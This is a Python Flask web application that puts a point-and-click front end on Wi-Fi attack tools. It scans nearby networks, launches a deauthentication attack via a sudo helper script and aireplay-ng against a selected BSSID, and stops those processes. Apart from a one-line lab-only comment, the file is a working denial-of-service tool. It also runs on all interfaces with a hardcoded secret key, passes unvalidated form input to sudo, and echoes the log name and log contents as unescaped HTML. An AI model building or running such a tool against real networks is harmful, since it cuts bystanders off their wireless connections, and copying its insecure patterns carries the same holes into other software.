#!/usr/bin/env python3
from flask import Flask, render_template, request, redirect, url_for, flash, send_file
import subprocess, os

APP_ROOT = os.path.dirname(os.path.abspath(__file__))
SCAN_SCRIPT = os.path.join(APP_ROOT, "scan_networks.sh")
DEAUTH_SCRIPT = os.path.join(APP_ROOT, "wifiDeauth.sh")
SCRIPT2 = os.path.join(APP_ROOT, "script2.sh")
SCRIPT3 = os.path.join(APP_ROOT, "script3.sh")
LOGDIR = "/tmp/wifigui-logs"  # wifiDeauth.sh writes here
os.makedirs(LOGDIR, exist_ok=True)

app = Flask(__name__)
app.secret_key = "change_me_please"

def run_bg(cmd_list, log_name=None):
    """
    Start a command detached. If log_name provided, append stdout/stderr to that file.
    """
    if log_name:
        f = open(os.path.join(LOGDIR, log_name), "ab")
        subprocess.Popen(cmd_list, stdout=f, stderr=f)
    else:
        subprocess.Popen(cmd_list, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def scan_networks(network_interface="wlan1", duration=15):
    try:
        proc = subprocess.run([SCAN_SCRIPT, network_interface, str(duration)],
                              capture_output=True, check=True, text=True)
        out = proc.stdout.strip()
        lines = [ln for ln in out.splitlines() if ln.strip()]
        entries = []
        for ln in lines:
            if ln.startswith("ERR:"):  # NoCSV etc.
                continue
            parts = ln.split(",", 2)
            if len(parts) >= 3:
                bssid, ch, essid = parts[0].strip(), parts[1].strip(), parts[2].strip()
                entries.append({"bssid": bssid, "ch": ch, "essid": essid})
        return entries
    except subprocess.CalledProcessError:
        return []

@app.route("/", methods=["GET","POST"])
def index():
    network_interface = request.form.get("interface", "wlan1")
    if request.method == "POST":
        action = request.form.get("action")
        if action == "scan":
            networks = scan_networks(network_interface)
            return render_template("index.html", networks=networks, interface=network_interface)
        elif action == "deauth":
            selected = request.form.get("selected_network", "")
            if not selected:
                flash("Select a network first.", "warning")
                return redirect(url_for("index"))
            try:
                bssid, ch, essid = selected.split("|", 2)
            except ValueError:
                flash("Invalid selection.", "danger")
                return redirect(url_for("index"))

            # Run the headless deauth script with BSSID/CH (locks channel internally)
            cmd = ["sudo", DEAUTH_SCRIPT, network_interface, bssid, ch]
            run_bg(cmd, log_name="deauth.log")
            flash(f"Deauth started for {essid} ({bssid}) on CH {ch}.", "success")
            return redirect(url_for("index"))
        elif action == "script2":
            run_bg(["/bin/bash", SCRIPT2], log_name="script2.log")
            flash("Script 2 (placeholder) started.", "info")
            return redirect(url_for("index"))
        elif action == "script3":
            run_bg(["/bin/bash", SCRIPT3], log_name="script3.log")
            flash("Script 3 (placeholder) started.", "info")
            return redirect(url_for("index"))

    # GET -> initial render with a scan
    networks = scan_networks()
    return render_template("index.html", networks=networks, interface="wlan1")

@app.route("/logs/<name>")
def show_log(name):
    # Allowed logs
    allowed = {
        "deauth": os.path.join(LOGDIR, "deauth.log"),
        "airodump-target": os.path.join(LOGDIR, "airodump-target.log"),
        "script2": os.path.join(LOGDIR, "script2.log"),
        "script3": os.path.join(LOGDIR, "script3.log"),
    }
    path = allowed.get(name)
    if not path or not os.path.exists(path):
        return f"No such log or file missing: {name}", 404
    # simple text response
    with open(path, "r", errors="ignore") as f:
        content = f.read()
    return f"<pre style='white-space:pre-wrap'>{content}</pre>"

@app.route("/stop", methods=["POST"])
def stop_attack():
    # Kill aireplay-ng & targeted airodump processes
    iface = request.form.get("interface", "wlan1")
    mon = iface + "mon"
    # Kill broadly but safely; we do not rely on PIDs here
    subprocess.run(["pkill", "-f", "aireplay-ng"], check=False)
    subprocess.run(["pkill", "-f", f"airodump-ng .* {mon}"], check=False)
    flash("Stopped attack processes (aireplay/targeted airodump).", "warning")
    return redirect(url_for("index"))

if __name__ == "__main__":
    # Run ONLY on trusted lab networks. Needs sudo for Wi-Fi tools.
    app.run(host="0.0.0.0", port=5000, debug=False)
